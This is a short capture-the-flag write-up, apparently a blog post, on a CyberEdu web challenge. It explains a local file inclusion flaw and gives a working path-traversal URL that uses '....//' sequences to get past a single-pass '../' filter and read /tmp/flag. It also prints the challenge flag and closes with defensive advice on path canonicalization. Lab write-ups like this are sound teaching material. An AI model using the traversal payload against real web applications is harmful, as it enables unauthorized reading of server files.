---
title: "file-crawler — CyberEdu CTF"
description: "Local File Inclusion (LFI) with path traversal filter bypass using double-dot sequences."
pubDate: 2025-03-01
tags: ["web", "lfi", "cyberedu"]
---

**Category:** Web / LFI
**Flag:** `CTF{0caec419d3ad1e1f052f06bae84d9106b77d166aae899c6dbe1355d10a4ba854}`

## Challenge

> Find the vulnerability and get the flag. The flag is located in a temporary folder.

The site serves images through a URL parameter — a classic LFI setup.

## Analysis

The source code reveals the image path comes from a query parameter. Standard `../` traversal sequences are filtered, but the filter is naive — it only strips exact `../` matches without recursing.

## Bypass

Use double-dot sequences that survive a single-pass filter strip:

```
....//  →  after stripping ../  →  ../
```

## Exploit

```
http://34.159.187.220:32586/local?image_name=....//....//....//....//....//....//tmp/flag
```

The filter strips one level of `../` from each `....//`, leaving a valid traversal path that reaches `/tmp/flag`.

## Takeaways

- LFI filters that do a single-pass replacement are bypassable with nested sequences.
- Use recursive sanitization or a proper path canonicalization function.
- Always validate that the resolved path stays within the intended directory (`realpath()` + prefix check).
